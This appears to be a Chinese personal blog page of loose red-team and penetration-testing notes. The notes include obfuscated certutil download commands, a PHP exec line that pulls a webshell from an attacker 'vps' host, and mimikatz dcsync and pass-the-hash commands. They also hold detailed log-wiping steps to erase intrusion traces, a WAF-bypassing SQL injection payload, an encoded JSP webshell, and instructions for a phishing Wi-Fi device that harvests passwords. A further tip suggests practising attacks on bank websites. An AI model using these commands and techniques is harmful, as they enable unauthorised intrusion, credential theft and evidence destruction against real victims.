<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">免杀还是具有时效性，如果有不怕时效性甚至能够像Ai一样自我升级<br><br>或者说有个很强大的论坛平台或者人群基数，去进行想法创新而产生的维护。这是我未来的一些思考和方向<br></code></pre></td></tr></table></figure>



<p>内核溢出是用来提权 不是用来拿shell<img src="file:///C:\Users\e'e't\AppData\Roaming\Tencent\QQTempSys\Z}4JA~3{S79KP7UYELJH" srcset="/img/loading.gif" lazyload alt="img">{7.gif)</p>
<p>拿到 shell 之后，发现有 360 主动防御和 360 杀毒？</p>
<p><strong>可以试试命令：</strong><strong><code>logoff 1</code> 或者 <code>logoff 2</code> ，会有意想不到的效果~</strong></p>
<p>拿到 shell，将 3389 端口转发出来之后，尝试连接发现出现问题，估计是限制了我这边的 IP 访问。</p>
<p><img src="G:/AppData/Roaming/Typora/typora-user-images/640.webp" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>解决方法：添加注册表 <code>AllowEncryptionOracle</code> 项即可。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lindajia/p/9021082.html">https://www.cnblogs.com/lindajia/p/9021082.html</a></p>
<p>一条命令直接解决（需要在 system32 目录下的 cmd 中执行）：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f</span><br></code></pre></td></tr></table></figure>



<p>进入内往后本地开服务，内网连接服务器下载lcx进行端口转发</p>
<p>在命令前加空格，命令不会被记录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[空格]<span class="hljs-built_in">cat</span> /etcpasswd<br></code></pre></td></tr></table></figure>



<p>坚持把不懂得渗透脚本函数写下来并背下来</p>
<p>cmd隐藏文件    attrib test.txt</p>
<p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p>
<p>•robots.txt•crossdomain.xml•sitemap.xml•后台目录•网站安装目录•网站上传目录•mysql管理页面•phpinfo•网站文本编辑器•测试文件•网站备份文件（.rar、.zip、.7z、.tar、.gz、.bak）•DS_Store文件•vim编辑器备份文件（.swp）•WEB-INF&#x2F;web.xml文件</p>
<p>蚁剑后渗透模块反弹shell到msf火绒不会查杀</p>
<p>钓鱼的时候先发多发几个文件。前几个就正常查询文件，最后一个做好宏免杀的木马。就行，有的人就一定会一个一个点进去看一看</p>
<p><img src="E:/typora%E5%9B%BE%E7%89%87/640.webp" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>“c””e””r””t””u””t””i””l” -“u””r””l””c””a””c””h””e” -split -f https:<em>&#x2F;&#x2F;url&#x2F;1.exe 1.exe</em></p>
<p>powershell编辑</p>
<p>可以用“您是盗版软件受害者”来钓鱼</p>
<p>可以用shell C:\tmp\bypassuac.exe C:\tmp\beacon.exe来提权</p>
<p>内网信息收集时导出所有spn到文本后，将主机名列出</p>
<p>grep “CN&#x3D;” spn.txt | awk -F “,” {‘print $1’} | awk -F “&#x3D;” {‘print $2’} &gt; host.txt</p>
<p>拿下了域控</p>
<p>导出ntds,抓下密码,这里使用mimikatz<code>lsadump::dcsync /domain:xxx /all /csv command</code></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Bvp47 在 Hook 掉__d_lookup 函数后主要用于自身文件的隐藏和触发自删除 流 程 ， 利 用 hook <br><br>__d_lookup 来 校 验 上 层 应 用 是 否 试 图 访 问 <span class="hljs-regexp">/usr/</span>bin/modload 文件<br><br>Hook devmem_is_allowed 后，用户态的 Bvp47 就可以任意读写内核空间了。<br><br>Bvp47 会通过修改内核模块 elf 文件的前四个字节，达到躲避内存搜索 elf 的目的，并通过自己的 <br><br>lkm loader 进行加载。 <br><br>BPF（Berkeley Packet Filter）是 Linux 内核中用来过滤自定义格式数据包的内核引擎，它可以提<br><br>供一套规定的语言供用户层的普通进程来过滤指定数据包。<br><br>Bvp47 直接利用 BPF 的这个特性作为隐蔽信道环节中在 Linux 内核层面的高级技巧，避免直接的<br><br>内核网络协议栈 hook 被追踪者检测出来。 <br><br>其它技术特点<br><br>不受信任的程序往往由沙箱运行并监测行为。程序运行时往往并没有真正落地，也就时说此时的<br><br>argv[<span class="hljs-number">0</span>]所指路径并不是程序的真正路径。程序通过syscall调用lstat，以求绕过SandboxRing3的<br><br>Hook，查看argv[<span class="hljs-number">0</span>]所指的文件是否真实存在。<br><br>**<span class="hljs-number">1</span>. 利用setrlimit api来设置core <span class="hljs-keyword">dump</span>文件（内核转存文件）大小<span class="hljs-number">0</span>，防止样本提取；**<br><br>**<span class="hljs-number">2</span>. argv[<span class="hljs-number">0</span>]与lstat结合的反沙箱技术；**<br><br>mkstmp时用来在Linux /tmp目录下生成临时文件的Api。（猜测时由于当时沙箱并没有对这个Api<br><br>提供支持，或者沙箱策略禁用了mkstmp。因此可以用mkstmp调用是否成功来识别沙箱）。<br><br>**<span class="hljs-number">3</span>. mkstmp 反沙箱技术**<br><br>沙箱中的<span class="hljs-regexp">/boot目录下的文件往往只有2个一个文件/</span>boot<span class="hljs-regexp">/.另一个/</span>boot<span class="hljs-regexp">/..。所以只要打开/</span>boot目<br><br>录统计/boot目录下的文件个数，往往可以识别沙箱。（Windows上会通过TEMP目录下的临时文<br><br>件数）。<br><br>**<span class="hljs-number">4</span>. /boot 反沙箱技术**<br><br>沙箱中的<span class="hljs-regexp">/boot目录下的文件往往只有2个一个文件/</span>boot<span class="hljs-regexp">/.另一个/</span>boot<span class="hljs-regexp">/..。所以只要打开/</span>boot目<br><br>录统计/boot目录下的文件个数，往往可以识别沙箱。（Windows上会通过TEMP目录下的临时文<br><br>件数）<br><br>**<span class="hljs-number">5</span>. Aip Flooting 与 延迟执行**<br><br>任何沙箱只会为每个样本分配有限的时间。因此调用大量合法Api，以达到延迟执行，用以躲过沙<br><br>箱的起爆分析。<br><br>rc-x<br><br>SYNKn<br></code></pre></td></tr></table></figure>

<p>遇到302 如何让sql跑起了</p>
<p>直接在响应包里面让他报错，然后让sqlmap自动识别即可  这个点可以记住</p>
<p>Arduino+esp8266+钓鱼wifi(20RMB)</p>
<ol>
<li>使用Arduino IDE 然后单片机是用的esp8266（具体编译环境的配置可以参考<a target="_blank" rel="noopener" href="http://www.taichi-maker.com/%EF%BC%89">http://www.taichi-maker.com/）</a></li>
<li>如果只是测试玩的话大概淘宝9.9元也是可以买到的，只不过如果需要带电池单元的话可能就须要再买个电池模块了</li>
<li>步骤是，先把写好的页面写入到闪存里面去，然后再把程序烧录到里面去，插上电就可以搞了</li>
<li>用户连接到我们的wifi（无密码），就会自动弹窗到钓鱼页面中去（这个利用了DNS协议）</li>
<li>用户输入口令到页面中，然后提交，程序就会把信息存储到&#x2F;info.txt中，也会输出到串口中</li>
<li>钓鱼完成后 使用show_info程序从闪存中读出来信息即可</li>
</ol>
<p>Ctrl+K+C快速批量注释</p>
<p>winodws桌面：TeamViewerQS单文件</p>
<p>windows下载文件；<br>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/backlion/demo/master/CVE-2017-11882-v1.py">https://raw.githubusercontent.com/backlion/demo/master/CVE-2017-11882-v1.py</a> test.py</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">日志清理:<br><br>winodws桌面：TeamViewerQS单文件<br><br>windows下载文件；<br>certutil -urlcache -split -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/backlion/</span>demo<span class="hljs-regexp">/master/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">11882</span>-v1.py test.py<br><br>防火墙日志路径：%systemroot%\system32\logfiles\<br>IIS日志路径：%systemroot%\system32\logfles\<br>windows系统日志：%systemroot%\system32\config\<br>Scheduler服务日志：%systemroot%\schedlgu.txt<br>日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog<br>系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx<br>安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx<br>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx<br><br>linux（检索根目录以及上级目录是否存在备份）<br><span class="hljs-number">1</span>.清空当前用户历史命令并删除相关文件：<br>history -c<br>echo “”&gt; <span class="hljs-regexp">/root/</span>.bash_history<br>echo “”&gt; <span class="hljs-regexp">/var/</span>run/utmp<br><span class="hljs-number">2</span>.清除部分日志：echo “”&gt; <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/secure；全删除如不能删除使用echo依次覆盖：rm -f -r /</span>var<span class="hljs-regexp">/log/</span>*；<br><span class="hljs-regexp">/var/</span>log/boot.log：录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息<br><span class="hljs-regexp">/var/</span>log/lastlog ：记录最后一次用户成功登陆的时间、登陆IP等信息<br><span class="hljs-regexp">/var/</span>log/messages ：记录Linux操作系统常见的系统和服务错误信息<br><span class="hljs-regexp">/var/</span>log/secure ：Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况<br><span class="hljs-regexp">/var/</span>log/btmp ：记录Linux登陆失败的用户、时间以及远程IP地址<br><span class="hljs-regexp">/var/</span>log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看<br><span class="hljs-regexp">/var/</span>log/wtmp：该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，使用last命令查看<br><span class="hljs-regexp">/var/</span>log/maillog 与邮件相关的日志信息<br><span class="hljs-regexp">/var/</span>log/cron 与定时任务相关的日志信息<br><span class="hljs-regexp">/var/</span>log/spooler 与UUCP和news设备相关的日志信息<br><span class="hljs-regexp">/var/</span>log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)<br><span class="hljs-regexp">/var/</span>run/utmp：该日志文件记录有关当前登录的每个用户的信息。如 who、w、users、finger等就需要访问这个文件<br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frsocks+protoplex+流量重定向实现端口复用<br>protoplex是一个协议复用的工具，比如以下命令可将本地<span class="hljs-number">9999</span>端口的流量根据协议类型转到本地的<span class="hljs-number">2333</span>和<span class="hljs-number">80</span>端口。用于绕过云主机的nsg安全规则。<br>./frsocks -sockstype fsocks -listen <span class="hljs-number">2333</span>  <span class="hljs-comment">//创建本地监听</span><br>./protoplex <span class="hljs-attr">--socks5</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">154.130</span>:<span class="hljs-number">2333</span> <span class="hljs-attr">--http</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">154.130</span>:<span class="hljs-number">9999</span>  <span class="hljs-comment">//端口分流，根据协议类型转到本地的2333和80端口</span><br>重定向命令<br>linux：<br>sudo iptables -t nat -A PREROUTING -<span class="hljs-selector-tag">p</span> tcp -m tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j REDIRECT <span class="hljs-attr">--to-ports</span> <span class="hljs-number">9999</span><br>windows:<br>netsh interface portproxy add v4tov4 listenport=<span class="hljs-number">80</span> listen address=<span class="hljs-number">192.168</span>.<span class="hljs-number">154.129</span> connectport=<span class="hljs-number">9999</span> connectaddress=<span class="hljs-number">192.168</span>.<span class="hljs-number">154.129</span><br><span class="hljs-number">1</span><span class="hljs-selector-class">.netsh</span> interface portproxy show <span class="hljs-attribute">all</span> //查看转发规则<br><span class="hljs-number">2</span><span class="hljs-selector-class">.netsh</span> interface portproxy reset   <span class="hljs-comment">//清除所有转发规则</span><br></code></pre></td></tr></table></figure>



<p> searchtometerpreter可以从commband shell 进入materpretershell</p>
<p>Impacker组件的py版本 进行收集比较稳。比mimikatz还稳</p>
<p>发现可以通过下载证书的方式得到webshell。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd.exe /c  certutil -urlcache -split -f http://vps/ccc.txt  webapps/nc_web/ccc.jsp&quot;</span>);<br></code></pre></td></tr></table></figure>



<p> 开启ntlm远程登陆，登陆远程桌面。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d <span class="hljs-number">00000000</span> /f        <br></code></pre></td></tr></table></figure>

<p>得到域控ip之后，不能直接通过ntlm登陆，先用smb管道开启ntlm登陆方式。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python3 smbexec.py -hashes :ntlm 域/域管用户@域控ip<br>并执行<br>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d <span class="hljs-number">00000000</span> /f <br></code></pre></td></tr></table></figure>

<p>应急响应中 查看回收站也是很重要的一环</p>
<p>应急响应中 在c盘的用户&#x2F;公用也是很重要的一环</p>
<p>在数据库的用户文件如果加盐了  就用同一个盐新建一个自己的user 就能用这个user登录</p>
<p>原来shell是可以学习编辑器的，多用正则表达式，精通正则&#x3D;精通shell</p>
<p>杀毒软件主要是基于 .txt 文件进行查杀的，而我们只需要对 .txt 文件进行些许的改动即可实现免杀。</p>
<p>复现后可以看工具原理和工具代码—再看源码为现代吗</p>
<p>在攻击结束后，如何不留痕迹的清除日志和操作记录，以掩盖入侵踪迹，这其实是一个细致的技术活。在蓝队的溯源中，攻击者的攻击路径都将记录在日志中，所遗留的工具也会被蓝队进行分析，在工具中可以查找特征，红队自研工具更容易留下蛛丝马迹。你所做的每一个操作，都要被抹掉；你所上传的工具，都应该被安全地删掉，以防被溯源在演练中失分。</p>
<p>微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用。</p>
<p>安全客投稿可以领取现金，当然技术下限也高</p>
<p>extension 这个环境变量，设置执行脚本是要引入的动态链接库文件（Linux 下是.so，Windows 下是.dll）：</p>
<p>！会做的不如会写的，会写的不如会说的。这对面试时候谈价钱很有用</p>
<p>要能够将写好的报告重要内容和原理有条理的口头叙述出来</p>
<p>ysosiral  就是一种调用他们自带的那些shiro啊 weblogic啥的payload去生成反序列化并自带有run模块上载到指定的网站进行命令执行。所以那个payload里面的部分命令执行代码也可改（但是不同中间件对应的模板只能轻改。（过waf啥的））。然后也可以自己写payload和command反序列化框架来进行自定义自己的命令执行。</p>
<p>域内就域控默认开启smb签名</p>
<p>命令后面加上<code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出</p>
<p>spn不是票据</p>
<p>msfm后渗透载荷里面有新建服务功能</p>
<p>APT攻击说到底就是有个好的钓鱼手法，好的免杀shellcode。好的隐藏配置。钓很多人的鱼</p>
<p>mimikatz不能抓取win10。但是可以用自带的lsass.exe弄进靶机搞hash</p>
<p>dns隐藏ip流量和dns隐藏隧道不一样。dns隐藏隧道就是利用dns服务直接像开监听器一样开dns监听器去进行接受反弹dnsshell。具有很强的穿透性和高速，但大多情况下用不到它。然后有些时候它又成了唯一方法。所以说dns隐藏隧道只是我们开隧道的一种方式。而不是我想的那种配合dns去隐藏frp、ew隧道那些</p>
<p>dns隐藏ip就是我们开c2服务器的时候在外网映射一样。可以把我们的c2服务器多层外网映射出去。然后再在公网ip分配dns。进行流量重发。从而达到防守方难以察觉我们dns的真正ip。</p>
<p>内存溢出可以造成RCE也可以用于内网提权。但两种利用方式不一样</p>
<p>rootkit始终是最终研究方向之一。十年前如此，十年后依旧如此</p>
<p>做shell到底还是用devc++。因为c都是向下兼容的</p>
<p>可以使用截屏命令看看是否处于锁屏状态</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415419.webp" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>如果处于锁屏状态。就无发对受害机利用远控软件（向日葵那些）</p>
<p>利用哥斯拉自带的shellcodeLoader上线到CS，这个模块在实战下还是很好用的</p>
<p>如果存在360，会被提示拦截，解决方法是注入到另一个system权限进程下去执行命令</p>
<p>PE文件的全称是Portable Executable，意为可移植的可执行的文件</p>
<p>xor就是异或，用于shellcode免杀</p>
<p>虚拟机逃逸和二进制和pwn有关系</p>
<p>webshell中如果没有回显，我们最好让它导出到当前地址，方便我们查看.</p>
<p>linux万物皆文件</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415422.png" srcset="/img/loading.gif" lazyload alt="image-20220119184342360"></p>
<p>ntdsl.dat是活动目录数据库。属于不可信程序。用wmic去复制弄出来可以隐蔽点免得被干。</p>
<p>当然上面部分写法是错的</p>
<p>蚁剑找寻数据操作时不能选mysql 要选mysql1因为mysql不能改端口  只能使用默认端口 而实际端口往往不一样</p>
<p>UAC</p>
<ul>
<li>配置Windows Update</li>
<li>增加或删除用户账户</li>
<li>改变用户的账户类型</li>
<li>改变UAC设置</li>
<li>安装ActiveX</li>
<li>安装或移除程序</li>
<li>安装设备驱动程序</li>
<li>设置家长控制</li>
<li>将文件移动或复制到Program Files或Windows目录</li>
<li>查看其他用户文件夹</li>
</ul>
<p>ms15-051 对win2008不蓝屏</p>
<p>MS16-014对win2008会蓝屏</p>
<p>不是所有的pe文件都可以用来当cs载荷进行横向。有的就不行  连上后会断 。具有适配性</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a> </p>
<p>一般需要满足服务的pe文件才适合</p>
<p><strong>svchost.exe 也可能是恶意软件所伪装</strong>，尤其是当它们存在于除C:\Windows\System32和C:\Windows\SysWOW64（仅64位）以外目录。</p>
<p>Ntds.dit卷影拷贝可以弄出里面的hash</p>
<p>更换思路，依旧从管理员到system出发，利用winlogon获得system权限，通过StartService启动trustedinstaller服务，从而进步获取trustedinstaller的权限，利用trustedinstaller来停止defender</p>
<p>rustinstall权限比system权限更大 而system无法stopdefence防护 但是trust可以</p>
<p>既有注册表开机自启动 又有服务开机自启动</p>
<p>什么iis解析漏洞、apache解析漏洞、tomcat解析漏洞基本上都发生于文件上传</p>
<p>非预期就是再命令字符串间具有错误的正则写法照成攻击者利用非预期错误，构造字符从而绕过正则，就比如<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/076c5b422c96%E4%B8%AD%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%9A%84%E5%8E%9F%E5%9B%A0%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%E6%AD%A3%E5%88%99%E5%86%99%E6%B3%95%E5%8C%B9%E9%85%8D%E4%BA%86%60|/%60%EF%BC%8C%E8%80%8C%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%9A%84%60/%60%E3%80%82%E8%80%8C%E4%B8%94%E8%BF%99%E7%A7%8D%E9%9D%9E%E9%A2%84%E6%9C%9F%E5%9B%A0%E4%B8%BA%E6%98%AF%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E3%80%82%E6%89%80%E4%BB%A5%E5%A4%A7%E9%83%A8%E5%88%86%E5%8F%91%E7%94%9F%E4%BA%8E%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E9%94%99%E8%AF%AF%E3%80%82%E6%89%80%E4%BB%A5%E5%86%8DPWN%EF%BC%8C%E9%80%86%E5%90%91,web%EF%BC%8C%E8%AF%AD%E8%A8%80%E4%B8%AD">https://www.jianshu.com/p/076c5b422c96中非预期的原因是错误的正则写法匹配了`|\`，而非预期的`\`。而且这种非预期因为是利用正则限制命令。所以大部分发生于系统上的错误。所以再PWN，逆向,web，语言中</a> 都有产生</p>
<p>400大多是没有将网址添加到hosts的原因</p>
<p>mitm6配合Krbrelax.py成功中继会得到证书。而且数据很多，需要辨别和提取成txt</p>
<p>原来.sh就是shell语言的标志</p>
<p>cs3.4才能上线winxp和2003 当然对cs4.4进行修改也可以</p>
<p>docker逃逸的一个方法：通过sda挂载、然后创建ssh私钥并写入主机ssh目录 然后连接</p>
<p>2022spring core</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415802.png" srcset="/img/loading.gif" lazyload alt="image-20220401232007718"></p>
<p>①前端加密的情况下waf是无法识别到你的恶意payload的②大家都不想打，是一块未被开发过的宝地。PS:大家想练手的话，可以找各种银行的站点，一般银行站点都有前端加密的。</p>
<p>对web控件进行右键然后”检查“，就能找出对应的F12js源码</p>
<p>我们可以将字典入库，增加keywordcount字段用于计数，当我们的关键词命中时，对应的keywordcount值加1。每次使用字典时，从数据库中order by keyword_count desc提取关键词，这样会生成一个根据关键词命中次数降序的字典，这样经常命中的关键词就会靠前，我们使用的字典的效率也会提高，循环往复我们的字典将会越加成熟。</p>
<ol>
<li><p>通过修改请求参数值后追加 单双引号 逐个重放，遍历每个参数，确认那个参数会引起响应异常。</p>
</li>
<li><p>对异常的参数，通过修改请求参数值后追加payload 来检测命令注入、ssrf、代码注入、sql注入、信息泄露等漏洞。</p>
</li>
</ol>
<p>调试浏览器</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/640" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>以前的远控器+现在的免杀也有很好的效果</p>
<p>印象笔记可以剪藏网页  要经常用它</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415769.png" srcset="/img/loading.gif" lazyload alt="image-20220412234745223"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415676.png" srcset="/img/loading.gif" lazyload alt="image-20220412234755608"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415850.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>php 可以这样用 和html套用</p>
<p>很多的<tr> &lt;&#x2F; tr&gt; 由此可以意识到该页面使用了wordpress</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">AND</span> <span class="hljs-built_in">mod</span>(<span class="hljs-number">29</span>,<span class="hljs-number">9</span>)<span class="hljs-operator">+</span>div<span class="hljs-operator">+</span><span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(concat(database(),&quot;--&quot;,&quot;_Y000!_&quot;))<span class="hljs-operator">+</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">+</span>DISTINCTROW<span class="hljs-operator">+</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">@a</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span><br><br><br><br>&quot;AND&quot; <span class="hljs-operator">=</span> 如果用<span class="hljs-keyword">AND</span>分隔的所有条件都为<span class="hljs-literal">TRUE</span>，则<span class="hljs-keyword">AND</span>运算符将返回一条记录。<br>&quot;mod(29,9)&quot; <span class="hljs-operator">=</span> mod的功能是在值之间进行划分<br>&quot;div&quot; <span class="hljs-operator">=</span> 在<span class="hljs-keyword">sql</span>中，div函数被视为除法<br>&quot;@a:=&quot; <span class="hljs-operator">=</span> 用于在内部保存<span class="hljs-keyword">SQL</span>查询，例如<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(concat(database(),&quot;--&quot;,&quot;_Y000!_&quot;)<br>&quot;union&quot; <span class="hljs-operator">=</span> 连接两个以上的<span class="hljs-keyword">sql</span>命令<br>&quot;distinctrow&quot; <span class="hljs-operator">=</span> 避免结果重复<br>&quot;select&quot; <span class="hljs-operator">=</span> 从数据库中选择我们想要的<br>&quot;数据库中的列数<br>&quot;<span class="hljs-keyword">AND</span> <span class="hljs-built_in">mod</span>(<span class="hljs-number">29</span>,<span class="hljs-number">9</span>)<span class="hljs-operator">+</span>div<span class="hljs-operator">+</span><span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(concat(database(),&quot;--&quot;,&quot;_Y000!_&quot;))<span class="hljs-operator">+</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">+</span>DISTINCTROW<span class="hljs-operator">+</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">@a</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&quot;<br></code></pre></td></tr></table></figure>



<p>可以木马写进txt 在通过上传无毒的jsp.php.等去引用这个txt就能bypass（检测文件内容的waf）</p>
<p>在审计某个模块代码时，我们可以通过跟踪数据流或者跟踪控制流的方式去阅读，那么那种方法比较好呢？答案是既不关心数据流也不关心控制流，而是只关注本模块的实现。因为多年的经验告诉我们，精神力是影响代码审计效率的重要原因，而在不同模块中来回跳转往往形成了精神的消耗。比如在某些复杂的项目代码中，查找某个函数的实现会不断地打开新文件，从而不断地涌出需要解决的新问题，在不断追踪的过程中，往往会迷失在好奇的海洋中，从而忘记了原来的审计任务。</p>
<p>如果确实要打破砂锅问到底，那么也建议在审计记录上先做个标记，等完成当前模块的审计后再对其进行深入分析。</p>
<p>如果某件事情手工做了三次，那么就应该写个脚本去进行自动化</p>
<p>如果上传jsp码 大部分都被拦截 甚至连hello world都拦截 可以尝试对木马进行加密 在网上查找相关的资料，发现LandGrey大佬的一个unicode编码的木马。<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp">https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FLandGrey%2Fwebshell-detect-bypass%2Ftree%2Fmaster%2Fwebshell%2Fjsp</a></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;<br>&lt;%!<br>\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0050\u0077\u0064\u003d\<br>.........<br>%&gt;<br></code></pre></td></tr></table></figure>



<p>遇到waf拦截菜刀流量的突破方法</p>
<p>下面是回显</p>
